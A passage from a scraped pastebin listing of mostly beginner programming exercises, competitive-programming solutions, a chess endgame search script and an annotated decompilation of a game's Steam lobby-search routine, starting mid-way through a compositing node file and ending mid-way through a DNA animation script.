			ViewInfo = UnderlayInfo {
				Pos = { 2971.52, 412.448 },
				Size = { 135.891, 86 }
			},
			Colors = { TileColor = { R = 0, G = 0.596078431372549, B = 0.6 }, }
		},
		NotesBG_Merge = Merge {
			NameSet = true,
			Inputs = {
				Background = Input {
					SourceOp = ""ChangeDepth_BG"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""Color"",
					Source = ""Output"",
				},
				PerformDepthMerge = Input { Value = 0, },
				FrameRenderScriptNest = Input { Value = 0, },
			},
			ViewInfo = OperatorInfo { Pos = { 2750, 280.5 } },
			Colors = { TileColor = { R = 0.584313725490196, G = 0.294117647058824, B = 0.803921568627451 }, }
		},
		ChangeDepth_BG = ChangeDepth {
			NameSet = true,
			Inputs = {
				Depth = Input { Value = 1, },
			},
			ViewInfo = OperatorInfo { Pos = { 2750, 247.5 } },
			Colors = { TileColor = { R = 0.584313725490196, G = 0.294117647058824, B = 0.803921568627451 }, }
		},
		Connect_Original_BG_and_Blacknotes_Merge_to_this = Underlay {
			NameSet = true,
			ViewInfo = UnderlayInfo {
				Pos = { 2728.56, 213.442 },
				Size = { 336.106, 120.058 }
			},
			Colors = { TileColor = { R = 0.584313725490196, G = 0.294117647058824, B = 0.803921568627451 }, }
		},
		Notes_BG = Background {
			NameSet = true,
			Inputs = {
				GlobalOut = Input { Value = 399, },
				Width = Input {
					Value = 3840,
					Expression = ""NotesBG_Merge.Background.OriginalWidth"",
				},
				Height = Input {
					Value = 720,
					Expression = ""NotesBG_Merge.Background.OriginalHeight"",
				},
				Depth = Input { Value = 1, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				TopRightRed = Input { Value = 1, },
				TopRightGreen = Input { Value = 1, },
				TopRightBlue = Input { Value = 1, },
				BottomLeftRed = Input { Value = 1, },
				BottomLeftGreen = Input { Value = 0.5, },
				BottomRightGreen = Input { Value = 0.5, },
				BottomRightBlue = Input { Value = 1, },
				Start = Input { Value = { 0.5, 0.5 }, },
				Gradient = Input {
					Value = Gradient {
						Colors = {
							[0] = { 1, 1, 1, 1 },
							[1] = { 0, 0, 0, 1 }
						}
					},
				},
			},
			ViewInfo = OperatorInfo { Pos = { 2420, -82.5 } },
			Colors = { TileColor = { R = 0.584313725490196, G = 0.294117647058824, B = 0.803921568627451 }, }
		},
		Connect_this_to__Note_Merges = Underlay {
			NameSet = true,
			ViewInfo = UnderlayInfo {
				Pos = { 2420.22, -112.898 },
				Size = { 202.545, 86 }
			},
			Colors = { TileColor = { R = 0.584313725490196, G = 0.294117647058824, B = 0.803921568627451 }, }
		}
	}
}"
S6spNDYK,Untitled,Abdula_2314124,C#,Sunday 18th of February 2024 12:34:41 PM CDT,"using System;

namespace IsElseLASTLesson
{
    class Program
    {
        static void Main(string[] args)
        {
            //int a = int.Parse(Console.ReadLine());
            //int b = Convert.ToInt32(Console.ReadLine());
            //int maxNumber = 0;

            //if (a > b)
            //{
            //    maxNumber = a;
            //    Console.WriteLine(""Max number "" + maxNumber);
            //}
            //else if (b > a)
            //{
            //    maxNumber = b;
            //    Console.WriteLine(""Max number "" + maxNumber);
            //}
            //else if (a == b)
            //{
            //    Console.WriteLine(""Numbers are Equal"");
            //}

            //Console.WriteLine(""Sho nebyti"");
            //char symbol = Console.ReadKey().KeyChar;

            //if (char.IsUpper(symbol))
            //{
            //    Console.WriteLine("" "");
            //}
            //else
            //{
            //    Console.WriteLine("" "");
            //}


            Random random = new Random();
            int stamina = random.Next(0, 100);

            Console.WriteLine(stamina);

            if (stamina >= 90)
            {
                Console.WriteLine("" "");
            }
            else if (stamina <= 10)
            {
                Console.WriteLine(""L"" + ""O"" + ""X"");
            }
            else if (stamina > 10 && stamina < 90)
            {
                Console.WriteLine("""");
            }












        }
    }
}
"
fiG9t1GG,Untitled,GreenComfyTea,C++,Sunday 18th of February 2024 12:31:51 PM CDT,"// Would be slightly easier if I had full function body ;)

steamApi = Steam_Internal_ContextInit(&PTR_SteamAPI_GetISteamMatchmaking_143e98558);

// www = 19?
// MaxSessionCount = 20?
MaxSessionCount = www + 1;

// If not session search, but a quest search
if(requestLobbyListCallback == 0) {
	// www = 19
	// MaxSessionCount = 19
	MaxSessionCount = www;
}

// Tell Matchmaking API to return 20 sessions
// MaxSessionCount is the variable you changed to 100 but still got 32 results?
// is MaxSessionCount the variable pointed in CE table?
(*(code *) (*steamApi)->vft->AddRequestLobbyListResultCountFilter(*steamApi, MaxSessionCount);

// ?
if((*(byte *) arr[1] & 4) != 0) {
	// minOpenSlotsCount = 1
	minOpenSlotsCount = arr[4];
}

// idk why it decided to not reuse existing steamApi variable here
steamApi_2 = Steam_Internal_ContextInit(&PTR_SteamAPI_GetISteamMatchmaking_143e98558);

// Tell Matchmaking API to return only sessions with minOpenSlotsCount >= 1
(*(code *) (*steamApi_2)->vft->AddRequestLobbyListResultNumericalFilter(*steamApi_2, s_SlotPublicOpen_1434fd928, minOpenSlotsCount, 2);

steamApi_2 = Steam_Internal_ContextInit(&PTR_LAB_143e84210);

// Japanese are british, illuminati confirmed.
// Why is this even gets called? AddFavoriteGame is supposed add your session to the Steam API when you host it.
// Where are the rest of parameters? AddFavoriteGame has like 6 parameters.
sessionLiveTime = (undefined8 *)(*(code *)(*steamApi_2)->vft->AddFavouriteGame)(*steamApi_2, &local_uuu_comparisonType);

FUN_1421e5790(local_ownerID, 0x1f, s_%01611X_14307a9d8, *sessionLiveTime);

steamApi_2 = Steam_Internal_ContextInit(&PTR_SteamAPI_GetISteamMatchmaking_143e98558);

// Tell Matchmaking API to return only sessions with ownerId not equal to local_ownerID
// Filters out your own session
// Prevents multiboxing?
(*(code *) (*steamApi_2)->vft->AddRequestLobbyListResultStringFilter(*steamApi_2, s_OwnerId_1434fd900, local_ownerID, 3);

// Player Type, Quest Preference, Rank Preference, Language?
if ((int) arr[5] > 0) {
	arr2 = arr[7];

	for(i = 0; i < (int) arr[5]; i++) {

		FUN_1421e5790(^local_ownerID, 0xf, s_SearchKey%d_142fc6b08, *arr2[-1]);
		uuu_comparisonType = ElobbyComparison_ARRAY_1434fdbf8[*arr2];

		steamApi_2 = Steam_Internal_ContextInit(&PTR_SteamAPI_GetISteamMatchmaking_143e98558);

		(*(code *) (*steamApi_2)->vft->AddRequestLobbyListResultNumericalFilter(*steamApi_2, &local_numericalComparisonKey, arr2[2], uuu_comparisonType);
		
		arr2 += 4;
	}
}

// ???
if(*(char *) (param_1 + 0x30) != '\0') {
	*(int *) (param_1 + 0x34) -= 1;
	LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 8));
}

/// ???
*(undefined4 *) (param_1 + 0x18714) = 0;

steamApi_2 = Steam_Internal_ContextInit(&PTR_SteamAPI_GetISteamMatchmaking_143e98558);

// Request Lobbies
requestLobbyListCallback = (*(code *)(*steamApi_2)->vft->RequestLobbyList)();

if(requestLobbyListCallback != 0) {
	uStack_50 = 0;
}
"
m1BQf1qK,Reti endgame,max2201111,Python,Sunday 18th of February 2024 11:52:36 AM CDT,"import chess

def initialize_game_tree(initial_fen, stronger, seeking_draw):
    """"""
    Initializes the game tree with the root node, specifying who is stronger and who is seeking a draw.
    """"""
    return {
        1: {
            'fen': initial_fen,
            'moves_to_mate': None,
            'parent': None,
            'color': chess.WHITE if initial_fen.split()[1] == 'w' else chess.BLACK,
            'result': None,
            'processed': False,
            'sequence': [],
            'up': False,
            'stronger': stronger,
            'seeking_draw': seeking_draw
        }
    }

depthh =0

def generate_descendants(game_tree, key, depth, max_depth=11):
    """"""
    Recursively generates descendant nodes up to a specified depth, considering all legal moves.
    """"""
    global depthh
    if depthh < depth:
        print(depth)
        depthh = depth
        
    if depth >= max_depth:
        return
    
    node = game_tree[key]
    board = chess.Board(node['fen'])
    
    for move in board.legal_moves:
        board.push(move)
        next_fen = board.fen()
        new_key = max(game_tree.keys()) + 1
        game_tree[new_key] = {
            'fen': next_fen,
            'moves_to_mate': None,
            'parent': key,
            'color': chess.WHITE if board.turn else chess.BLACK,
            'result': None,
            'processed': False,
            'sequence': node['sequence'] + [move.uci()],
            'up': False,
            'stronger': node['stronger'],
            'seeking_draw': node['seeking_draw']
        }
        board.pop()
        generate_descendants(game_tree, new_key, depth + 1, max_depth)

def evaluate_terminal_positions(game_tree):
    """"""
    Evaluates terminal positions to identify wins, losses, and draws, considering who is seeking a draw.
    """"""
    for key, node in game_tree.items():
        board = chess.Board(node['fen'])
        if board.is_checkmate():
            # A win is marked as 1 for the player not seeking a draw if they're stronger.
            node['result'] = 1 if node['color'] != node['stronger'] and not node['seeking_draw'][node['color']] else 0
            node['processed'] = True
        elif board.is_stalemate() or board.is_insufficient_material() or board.can_claim_draw():
            node['result'] = 0.5  # Draw
            node['processed'] = True

def propagate_results_upwards(game_tree):
    """"""
    Propagates the evaluation results upwards through the game tree, considering seeking_draw.
    """"""
    for key in sorted(game_tree.keys(), reverse=True):
        node = game_tree[key]
        if node['parent'] is None or node['processed']:
            continue

        parent_key = node['parent']
        parent_node = game_tree[parent_key]
        if parent_node['up']:
            continue

        children = [game_tree[k] for k in game_tree if game_tree[k]['parent'] == parent_key and game_tree[k]['processed']]
        
        if any(child['result'] == 1 for child in children if child['color'] != parent_node['color']):
            parent_node['result'] = 1
        elif all(child['result'] == 0.5 for child in children):
            parent_node['result'] = 0.5
        else:
            parent_node['result'] = 0 if parent_node['color'] == parent_node['stronger'] else 1

        parent_node['processed'] = True
        parent_node['up'] = True

def main():
    initial_fen = ""7K/8/k1P5/7p/8/8/8/8 w - - 0 1""
    stronger = chess.BLACK  # Black is considered the stronger side
    seeking_draw = {chess.WHITE: True, chess.BLACK: False}  # White is seeking a draw
    
    game_tree = initialize_game_tree(initial_fen, stronger, seeking_draw)
    generate_descendants(game_tree, 1, 0)
    evaluate_terminal_positions(game_tree)
    propagate_results_upwards(game_tree)

    # Print the result at the root node after propagation
    root = game_tree[1]
    print(f""Root Node: Result: {root['result']}, Processed: {root['processed']}"")

if __name__ == ""__main__"":
    main()"
s5s4pGXM,Sol,LEGEND2004,C++,Sunday 18th of February 2024 11:51:08 AM CDT,"#include <bits/stdc++.h>
using namespace std;

#define int long long
#define fastio ios_base::sync_with_stdio(0); cin.tie(0)

signed main()
{
	fastio;
	/*
    // Junior B
    int n , k;
    cin >> n >> k;
    cout << min(n % k , k - n % k);
    */
    /*
    // Junior A
    int n , k;
    cin >> n >> k;
    int x = k / n , y = k % n;
    int sum = 0;
    if(x > 0){
        sum += k - n;
    }
    if(x < n - 1){
        sum += k + n;
    }
    if(y > 0){
        sum += k - 1;
    }
    if(y < n - 1){
        sum += k + 1;
    }
    cout << sum;
    */
    /*
    // Senior A
    int n , s , m , q;
    cin >> n >> s;
    int ans = 0;
    bool ok = false;
    for(int i = 0; i < n; i++){
        cin >> m >> q;
        if(m * 100 + q <= s * 100){
            ok = true;
            if(q != 0)
                ans = max(ans , 100 - q);
        }
    }
    if(!ok){
        cout << -1;
        return 0;
    }
    cout << ans;
    */
    /*
    // Senior B
    int n , k;
    cin >> n;
    bool used[n + 1] = {0};
    for(int i = 1; i <= n; i++){
        cin >> k;
        used[k] = 1;
    }
    for(int i = 1; i <= n; i++){
        if(!used[i]){
            cout << i;
            return 0;
        }
    }
    cout << -1;
    */
}
"
Ujpkm2Nq,numbers,Nenogzar,Python,Sunday 18th of February 2024 11:46:27 AM CDT,"count_of_numbers = list(map(int, input().split()))
command = input().split()
while command[0] != ""Finish"":
    if len(command) <= 2:
        action = command[0]
        value = int(command[1])
        if action == ""Add"":
            count_of_numbers.append(value)
        elif action == ""Remove"":
            count_of_numbers.remove(value)
        elif action == ""Collapse"":
            for i in count_of_numbers:
                if i < value:
                    count_of_numbers.remove(i)
    elif len(command) > 2:
        value = int(command[1])
        replacement = int(command[2])

        index = count_of_numbers.index(value)
        count_of_numbers.pop(index)
        count_of_numbers.insert(index, replacement)

    command = input().split()

print(*count_of_numbers, sep="" "")"
J4FHUtDh,ding,absolute_man_of_fart,JSON,Sunday 18th of February 2024 11:34:44 AM CDT,Cuh
u3wNeLww,W2L1(Lecture3)-FP24-Vlad-Batch2Q5-WL,VladNitu,Haskell,Sunday 18th of February 2024 11:05:38 AM CDT," 
import Data.List

reindex :: (Int -> Int) -> [a] -> [a]
reindex f xs = map fst (sortBy sortFunction elements_indexes_after_f)
  where
    elements_indexes = zip xs [0 .. length xs - 1]
    elements_indexes_after_f = map (\(x, id) -> (x, f id)) elements_indexes
    sortFunction x y
      | snd x < snd y = LT
      | snd x > snd y = GT
      | otherwise = EQ
    -- (Shorter) alternative: sortFunction = \(_, a)  (_, b) -> compare a b"
rxK195Vr,computer store,Nenogzar,Python,Sunday 18th of February 2024 10:54:49 AM CDT,"total_sum = 0
data = input()


special = 1


while data != ""special"" and data != ""regular"":
    price = float(data)

    if price > 0:
        total_sum += price
    else:
        print(""Invalid price!"")

    data = input()

taxes = total_sum * 0.2

if data == ""special"":
    special = 0.9

if total_sum == 0:
    print(""Invalid order!"")

else:
    print(""Congratulations you've just bought a new computer!"")
    print(f""Price without taxes: {total_sum:.2f}$"")
    print(f""Taxes: {taxes:.2f}$"")
    print(""-----------"")
    print(f""Total price: {(total_sum + taxes) * special:.2f}$"")"
ERvQPMz7,createBinarySearchTree.c,Aravind_reddy10,C,Sunday 18th of February 2024 10:52:02 AM CDT,"#include <stdio.h>
#include <stdlib.h>
struct Tree
{
    int data;
    struct Tree *left,*right;
}*tp;
struct Tree *create(struct Tree *root,int key)
{
    struct Tree *temp;
    if(root==NULL)
    {
        temp=(struct Tree*)malloc(sizeof(struct Tree));
        temp->data=key;
        temp->left=NULL;
        temp->right=NULL;
        return temp;
    }
    else if(key<root->data)
    {
        root->left=create(root->left,key);
    }
    else
    {
        root->right=create(root->right,key);
    }
    return root;
}
void inOrder( struct Tree *root) {
    if(root==NULL){
        return;
    }
    inOrder(root->left);
    printf(""%d "",root->data);
    inOrder(root->right);

}
void preOrder( struct Tree *root) {
    if(root==NULL){
        return;
    }
    printf(""%d "",root->data);
    preOrder(root->left);
    preOrder(root->right);

}
int searchBST(struct Tree *root,int key)
{
    if(root==NULL)
    {
        return -1;
    }
    else if(root->data==key)
    {
        return root->data;
    }
    else if(key>root->data)
    {
        return searchBST(root->right,key);
    }
    else
    {
        return searchBST(root->left,key);
    }
}
int height(struct Tree* root)
{
    int x,y;
    if(root==NULL)
    {
        return 0;
    }
    else
    {
        x=height(root->left);
        y=height(root->right);
    }
    if(x>y)
    {
        return x+1;
    }
    else
    {
        return y+1;
    }
}
struct Tree *Inpre(struct Tree *root)
{
    while(root!=NULL&&root->right!=NULL)
    {
        root=root->right;
    }
    return root;
}
struct Tree *Insucc(struct Tree *root)
{
    while(root!=NULL&&root->left!=NULL)
    {
        root=root->left;
    }
    return root;
}
struct Tree *delete(struct Tree *root,int d_val)
{
    if(root==NULL)
    {
        return NULL;
    }
    if(root->left==NULL&&root->right==NULL)
    {
        free(root);
        return NULL;
    }
    if(d_val<root->data)
    {
        root->left=delete(root->left,d_val);
    }
    else if(d_val>root->data)
    {
        root->right=delete(root->right,d_val);
    }
    else
    {
        if(height(root->left)>height(root->right))
        {
            tp=Inpre(root->left);
            root->data=tp->data;
            root->left=delete(root->left,tp->data);
        }
        else
        {
            tp=Insucc(root->right);
            root->data=tp->data;
            root->right=delete(root->right,tp->data);
        }
    }
    return root;
}
int main()
{
    struct Tree *root=NULL,*tmp;
    int n,i,val,search_val,d_val;
    printf(""Enter no of nodes:"");
    scanf(""%d"",&n);
    for(i=0;i<n;i++)
    {
        scanf(""%d"",&val);
        root=create(root,val);
    }
    inOrder(root);
    printf(""\n"");
    printf(""Enter searched value:"");
    scanf(""%d"",&search_val);
    int ans=searchBST(root,search_val);
    printf(""The search value is : %d is found"",ans);
    //preOrder(root);
    printf(""\n"");
    printf(""Enter deleted value:"");
    scanf(""%d"",&d_val);
    tmp=delete(root,d_val);
    printf(""The value is %d Deleted"",tmp->data);
    printf(""\n"");
    inOrder(root);

    return 0;
    
}"
WbBU9Kz8,maximize,nmh07000,Java,Sunday 18th of February 2024 10:51:03 AM CDT,"import java.util.*;
public class maximize {
    
    public static int search(int[] arr, int value) {
        int low = 0, high = arr.length, mid = 0;
        while(low < high) {
            mid = (low+high)/2;
            if(value < arr[mid]) {
                high = mid;
            }
            else {
                low = mid+1;
            }
        }
        return (arr.length - low);
    }
    
    public static void main(String[] args) {
        Scanner scan = new Scanner(System.in);
        int n = scan.nextInt();
        int q = scan.nextInt();
        
        int[] closing = new int[n];
        int[] time = new int[n];
        int[] diffs = new int[n];
        for(int i=0; i<n; i++) {
            closing[i] = scan.nextInt();
        }
        for(int i=0; i<n; i++) {
            time[i] = scan.nextInt();
        }
        for(int i=0; i<n; i++) {
            diffs[i] = closing[i] - time[i];
        }
        Arrays.sort(diffs);

        for(int queries=0; queries<q; queries++) {
            int V = scan.nextInt();
            int S = scan.nextInt();
            int count = 0;
            boolean good = false;
            
            good = search(diffs, S) >= V;
            
            if(good) {
                System.out.println(""YES"");
            }
            else {
                System.out.println(""NO"");
            }
        }
    }
}"
KzQU9Hz9,W2L1(Lecture3)-FP24-Vlad-Batch2Q4-WL,VladNitu,Haskell,Sunday 18th of February 2024 10:50:55 AM CDT,"import Prelude hiding (map, iterate)

map :: (a -> b) -> [a] -> [b]
map f xs = unfold null (f . head) (tail) xs

iterate :: (a -> a) -> a -> [a]
iterate f x = unfold (\x -> False) id f x"
FTMeb4bY,"Solutions junior, senior",LEGEND2004,C++,Sunday 18th of February 2024 10:46:18 AM CDT,"#include <bits/stdc++.h>
using namespace std;

#define int long long
#define fastio ios_base::sync_with_stdio(0); cin.tie(0)

signed main()
{
	fastio;
    /*
    //Junior B
	int n , k;
	cin >> n >> k;
	cout << min(n % k , k - n % k);
	*/
	/*
	//Junior A
	int n , k;
	cin >> n >> k;
	int x = n / k , y = n % k;
	int sum = 0;
	if(x > 0){
        sum += k - n;
	}
	if(x < n - 1){
        sum += k + n;
	}
	if(y > 0){
        sum += k - 1;
	}
	if(y < n - 1){
        sum += k + 1;
	}
	cout << sum;
	*/
	/*
	0  1  2  3
	4  5  6  7
	8  9  10 11
	12 13 14 15
	*/
	/*
	//Junior D
	string s;
	cin >> s;
	int k;
	cin >> k;
	int n = s.size();
	bool used[n + 5] = {0};
	int cnt = 0;
	for(int i = 0; i + i < n; i++){
        if(s[i] != s[n - i - 1]){
            cnt++;
            if(s[i] < s[n - i - 1])
                s[i] = s[n - i - 1];
            else
                s[n - i - 1] = s[i];
            used[i] = 1;
        }
	}
	if(cnt > k){
        cout << "":("";
        return 0;
	}
	k -= cnt;
	for(int i = 0; i + i < n; i++){
        if(s[i] == 'z')
            continue;
        if(used[i] && k > 0){
            s[i] = 'z';
            s[n - i - 1] = 'z';
            k--;
        }
        int say = 1;
        if(i != n - i - 1)
            say++;

        if(k >= say){
            s[i] = 'z';
            s[n - i - 1] = 'z';
            k -= say;
        }
	}
	cout << s << '\n';
	*/
	/*
	// Senior A
    int n , s , m , q;
    cin >> n >> s;
    int ans = 0; // qalan qepiklerin sayi
    bool ok = 0; // tort ala bileremmi?
    for(int i = 0; i < n; i++){
        cin >> m >> q;
        if(m * 100 + q <= s * 100){
            ok = 1;
            if(q != 0)
                ans = max(ans , 100 - q);
        }
    }
    if(ok == 0){ // ala bilmiremse
        cout << -1;
        return 0;
    }
    cout << ans;
    */
    /*
    // Senior B
    int n , k;
    cin >> n;
    bool used[n + 1] = {0};
    for(int i = 0; i < n; i++){
        cin >> k;
        used[k] = 1;
    }
    for(int i = 1; i <= n; i++){
        if(used[i] == 0){
            cout << i;
            return 0;
        }
    }
    cout << -1;
    */

}
"
rC1f7FHy,Untitled,LukeSavefrogs,HTML,Sunday 18th of February 2024 10:19:36 AM CDT,"<div class=""flex flex-col items-center bg-white border border-gray-200 rounded-lg shadow md:flex-row md:max-w-xl dark:border-gray-700 dark:bg-gray-800"">

  <figure id=""profile-image"" class=""object-cover w-full rounded-t-lg h-96 md:h-auto md:w-48 md:rounded-none md:rounded-s-lg"">
      <img src=""https://images.pexels.com/photos/1024984/pexels-photo-1024984.jpeg"" alt="""" />
  </figure>
  
  <div class=""flex flex-col justify-between p-4 leading-normal"">
    <h5 class=""mb-2 text-2xl font-bold tracking-tight text-accent dark:text-white"">{title}</h5>
    <p class=""mb-3 font-normal text-gray-700 dark:text-gray-400"">{description}</p>
  </div>
</div>"
13aSJQYP,Untitled,dllbridge,C,Sunday 18th of February 2024 10:12:16 AM CDT,"
#define _CRT_SECURE_NO_WARNINGS


#include  <stdio.h>
#include <stdlib.h>
#include <locale.h>

int _RGB(int, int, int);

///////////////////////////////////////////////////////////
int main()                                               //
{
	
	int n = _RGB(10, 22, 22);
	printf(""n = %d\n"", n);

}



////////////////////////////////////////////////////////////
int _RGB(int R, int G, int B )                             //
{
    int nRes = 0; 
    __asm
	{
       mov  eax, R
       add  eax, 4
	   mov nRes, eax
	}
return nRes;
}

"
iwdP6QqM,W2L1(Lecture3)-FP24-Vlad-Batch2Q3-WL,VladNitu,Haskell,Sunday 18th of February 2024 09:46:57 AM CDT,"import Prelude hiding (map, filter, all, any, takeWhile, dropWhile)

map :: (a -> b) -> [a] -> [b]
-- List comprehension
map f xs = [f x | x <- xs]

filter :: (a -> Bool) -> [a] -> [a]
-- Explicit recursion
filter p [] = []
filter p (x : xs) 
  | p x = (x : filter p xs) 
  | otherwise =  filter p xs

all :: (a -> Bool) -> [a] -> Bool
-- Using the library function foldr
all p xs = foldr (\x acc -> (p x) && acc) True xs
-- Using recursion
all p [] = True
all p (x : xs) 
  | p x = all p xs
  | otherwise = False
    
any :: (a -> Bool) -> [a] -> Bool
-- Using the library function foldr
any p xs = foldr (\x acc -> (p x) || acc) False xs
-- TODO: Using explicit recursion
any p [] = False -- At least (>=) 1 element must be `p x`
any p (x : xs)
  | p x = True
  | otherwise = any p xs
  
-- TODO: Using list comprehension


takeWhile :: (a -> Bool) -> [a] -> [a]
-- Explicit recursion
takeWhile p [] = []
takeWhile p (x : xs)
  | p x = x : takeWhile p xs
  | otherwise = []

dropWhile :: (a -> Bool) -> [a] -> [a]
-- Explicit recursion
dropWhile p [] = []
dropWhile p (x : xs)
  | p x = dropWhile p xs -- drop
  | otherwise = (x : xs)
-- TODO: Using foldr"
E3Yp69x0,RewardPresenter Like a Visitor,Pro_Unit,C#,Sunday 18th of February 2024 09:43:27 AM CDT,"using System.Collections.Generic;

using StatefulUI.Core;

namespace Game.RewardsSystem.Presenters
{
	public class RewardPresenter
	{
		private readonly IEnumerable<IRewardPresenter> _visitors;

		public RewardPresenter(IEnumerable<IRewardPresenter> visitors) =>
			_visitors = visitors;

		public void Display(StatefulComponent view, IReward reward)
		{
			foreach(IRewardPresenter visitor in _visitors)
				if (visitor.IsMy(reward))
					visitor.Display(view, reward);
		}
	}

	public abstract class RewardPresenter<TRewardType> : IRewardPresenter where TRewardType : IReward
	{
		public bool IsMy<T>(T reward) where T : IReward => reward is TRewardType;

		public void Display(StatefulComponent view, IReward reward)
		{
			if (reward is TRewardType typedReward)
				Display(view, typedReward);
		}

		protected abstract void Display(StatefulComponent view, TRewardType reward);
	}
}
using StatefulUI.Core;

using StatefulUISupport.Scripts.Components;

namespace Game.RewardsSystem.Presenters
{
	public class CardRewardPresenter : RewardPresenter<CollectibleCardsReward>
	{
		protected override void Display(StatefulComponent root, CollectibleCardsReward reward)
		{
			root.SetState(StateRole.Card);

			StatefulComponent view = root.GetInnerComponent(InnerComponentRole.Card);

			view.SetImageSprite(ImageRole.Icon, reward.Icon);
		}
	}
}
using StatefulUI.Core;

using StatefulUISupport.Scripts.Components;

namespace Game.RewardsSystem.Presenters
{
	public class CurrencyRewardPresenter : RewardPresenter<CurrencyReward>
	{
		protected override void Display(StatefulComponent root, CurrencyReward reward)
		{
			root.SetState(StateRole.Currency);

			StatefulComponent view = root.GetInnerComponent(InnerComponentRole.Currency);

			view.GetImage(ImageRole.Icon).SetSprite(reward.Type.Icon);
			view.GetText(TextRole.Value).SetText(reward.Amount.ToString());
		}
	}
}
using Game.RewardsSystem.Factories;

using StatefulUI.Core;

using StrongExtensions;

namespace Game.RewardsSystem.Presenters
{
	public class EmptyRewardPresenter : RewardPresenter<EmptyReward>
	{
		protected override void Display(StatefulComponent view, EmptyReward reward) =>
			view.gameObject.Destroy();
	}
}"
Animwtxv,Untitled,nicolasplays,UPC,Sunday 18th of February 2024 09:17:39 AM CDT,frgg
nDjBtwGi,Tkinter,Osiris1002,Python,Sunday 18th of February 2024 09:13:36 AM CDT,"import tkinter as Tkinter
def println():
    x = inputBox.get()
    #Replace current label into new label
    label[""text""] = x
    label.pack()

def bye():
    #Close the window
    window.destroy()

#create window
window = Tkinter.Tk()
window.title("" "")

#create a button
button1 = Tkinter.Button(window,text=""Button1"",command=println)
button1.pack()

button2 = Tkinter.Button(window,text=""Button2"",command=bye)
button2.pack()

#Create a line of text
label = Tkinter.Label(window,text=""Press this button to be suprised."")
label.pack()

#Create an input box
inputBox = Tkinter.Entry(window)
inputBox.pack()

#Show the window
window.mainloop()
"
NeHD8Uq4,tkinter,Osiris1002,Python,Sunday 18th of February 2024 09:10:26 AM CDT,"import tkinter as tk

def refresh_window():
    # Redraw the window
    window.update()
    window.update_idletasks()
    print(""Refresh completed."")

# Create the main window
window = tk.Tk()
window.geometry(""300x300"")
window.title(""PythonExamples.org"")

label = tk.Label(window, text=""Click the below button to refresh the window."")
label.pack()

button = tk.Button(window, text=""Refresh"", command=refresh_window)
button.pack()"
CAth5abZ,W2L1(Lecture3)-FP24-Vlad-Batch1Q7-WL,VladNitu,Haskell,Sunday 18th of February 2024 09:07:25 AM CDT,"skips :: [a] -> [[a]]
skips xs =
  map generateSublist [1..length xs]
    where
      generateSublist i =
        map fst (filter (\(x, id) -> id `mod` i == 0) (zip xs [1..length xs]))
       "
jjrkicGx,Untitled,Nenogzar,Python,Sunday 18th of February 2024 08:54:09 AM CDT,"budget = float(input())
season = str(input())

destination = """"

if budget <= 100:
    destination = 'Bulgaria'
    if season == 'summer':
        type_of_trip = 'Camp'
        trip_expense = budget * 0.30
    elif season == 'winter':
        type_of_trip = 'Hotel'
        trip_expense = budget * 0.70
elif 100 < budget <= 1000:
    destination = 'Balkans'
    if season == 'summer':
        type_of_trip = 'Camp'
        trip_expense = budget * 0.40
    elif season == 'winter':
        type_of_trip = 'Hotel'
        trip_expense = budget * 0.80
elif budget > 1000:
    destination = 'Europe'
    type_of_trip = 'Hotel'
    trip_expense = budget * 0.90

if destination:
    print(f""Somewhere in {destination}"")
    print(f""{type_of_trip} - {trip_expense:.2f}"")"
m7VVcJnM,Untitled,Nenogzar,Python,Sunday 18th of February 2024 08:52:07 AM CDT,"degrees = int(input())
time_of_the_day = input()

outfit = None
shoes = None

if 10 <= degrees <= 18:
    if time_of_the_day == ""Morning"":
        outfit = ""Sweatshirt""
        shoes = ""Sneakers""
    elif time_of_the_day == ""Afternoon"":
        outfit = ""Shirt""
        shoes = ""Moccasins""
    elif time_of_the_day == ""Evening"":
        outfit = ""Shirt""
        shoes = ""Moccasins""

elif 18 < degrees <= 24:
    if time_of_the_day == ""Morning"":
        outfit = ""Shirt""
        shoes = ""Moccasins""
    elif time_of_the_day == ""Afternoon"":
        outfit = ""T-Shirt""
        shoes = ""Sandals""
    elif time_of_the_day == ""Evening"":
        outfit = ""T-Shirt""
        shoes = ""Moccasins""

elif degrees >= 25:
    if time_of_the_day == ""Morning"":
        outfit = ""T-Shirt""
        shoes = ""Sandals""
    elif time_of_the_day == ""Afternoon"":
        outfit = ""Swim Suit""
        shoes = ""Barefoot""
    elif time_of_the_day == ""Evening"":
        outfit = ""Shirt""
        shoes = ""Moccasins""

print(f""It's {degrees} degrees, get your {outfit} and {shoes}."")"
xWfsEk50,Dna,Osiris1002,Python,Sunday 18th of February 2024 08:44:28 AM CDT,"""""""DNA, by Al Sweigart al@inventwithpython.com
A simple animation of a DNA double-helix. Press Ctrl-C to stop.
Inspired by matoken https://asciinema.org/a/155441
This code is available at https://nostarch.com/big-book-small-python-programming
Tags: short, artistic, scrolling, science""""""

import random, sys, time

PAUSE = 0.15  # (!) Try changing this to 0.5 or 0.0.

# These are the individual rows of the DNA animation:
ROWS = [
    #123456789 <- Use this to measure the number of spaces:
    '         ##',  # Index 0 has no {}.
    '        #{}-{}#',
    '       #{}---{}#',
    '      #{}-----{}#',
    '     #{}------{}#',
    '    #{}------{}#',
    '    #{}-----{}#',
    '     #{}---{}#',
    '     #{}-{}#',
    '      ##',  # Index 9 has no {}.
    '     #{}-{}#',
    '     #{}---{}#',
    '    #{}-----{}#',
    '    #{}------{}#',
    '     #{}------{}#',
    '      #{}-----{}#',
    '       #{}---{}#',
    '        #{}-{}#']
    #123456789 <- Use this to measure the number of spaces:

try:
    print('DNA Animation, by Al Sweigart al@inventwithpython.com')
    print('Press Ctrl-C to quit...')
    time.sleep(2)
    rowIndex = 0

    while True:  # Main program loop.
        # Increment rowIndex to draw next row:
        rowIndex = rowIndex + 1
        if rowIndex == len(ROWS):
            rowIndex = 0

        # Row indexes 0 and 9 don't have nucleotides:
        if rowIndex == 0 or rowIndex == 9:
            print(ROWS[rowIndex])
            continue

        # Select random nucleotide pairs, guanine-cytosine and
        # adenine-thymine:
        randomSelection = random.randint(1, 4)
        if randomSelection == 1:
            leftNucleotide, rightNucleotide = 'A', 'T'
        elif randomSelection == 2:
            leftNucleotide, rightNucleotide = 'T', 'A'
        elif randomSelection == 3:
            leftNucleotide, rightNucleotide = 'C', 'G'
        elif randomSelection == 4:
            leftNucleotide, rightNucleotide = 'G', 'C'

        # Print the row.
        print(ROWS[rowIndex].format(leftNucleotide, rightNucleotide))
